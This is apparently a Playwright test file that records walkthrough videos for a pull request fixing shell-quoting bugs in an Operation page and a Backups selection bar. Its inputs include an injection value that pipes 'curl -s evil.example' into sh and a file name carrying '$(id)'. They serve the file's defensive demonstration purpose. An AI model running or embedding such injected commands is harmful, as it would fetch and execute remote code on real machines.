/**
 * Slow pass over the two screens in 1253-twin-quoting.spec.ts, for the GIFs
 * in #1253's PR: the Operation page opened from a crafted link, and the
 * Backups selection bar with a backup whose file name a shell would act on,
 * each with its terminal line outlined. It asserts nothing about the lines,
 * so the one spec records the broken screens before the fix and the fixed
 * ones after it. Run with E2E_VIDEO=1.
 */
import { expect, test } from "@playwright/test";
import type { Page } from "@playwright/test";
import { open } from "./helpers";

const beat = (p: Page, ms = 1200) => p.waitForTimeout(ms);
test.describe.configure({ timeout: 60_000 });
test.skip(!process.env.E2E_VIDEO, "recording only, run with E2E_VIDEO=1");

/** Outlines the elements matching selector and wraps a code line so all
 *  of it is in the recording. Test-only; nothing here ships. */
async function mark(page: Page, selector: string) {
  await page.evaluate((sel) => {
    document.querySelectorAll(sel).forEach((e) => {
      const h = e as HTMLElement;
      h.style.outline = "2px dashed #d11a2a";
      h.style.outlineOffset = "2px";
      if (h.tagName === "CODE") h.style.whiteSpace = "pre-wrap";
      h.scrollIntoView({ block: "center" });
    });
  }, selector);
}

test("1253 walkthrough: the Operation page from a crafted link", async ({ page }) => {
  await open(page, "/assurance/operations/" + encodeURIComponent("x; curl -s evil.example|sh"));
  await expect(page.getByTestId("operation-page").locator("code").first()).toBeVisible();
  await beat(page);
  await mark(page, "[data-testid=operation-page] code");
  await beat(page, 3000);
});

test("1253 walkthrough: the selection bar with a file name a shell would act on", async ({ page }) => {
  await open(page, "/backups", "backups-hostile-filename");
  await beat(page);
  await page.getByRole("checkbox", { name: "Select prod $(id).dump.zst", exact: true }).check();
  await expect(page.getByTestId("recover-command")).toBeVisible();
  await beat(page);
  await mark(page, "[data-testid=recover-command]");
  await beat(page, 3000);
});
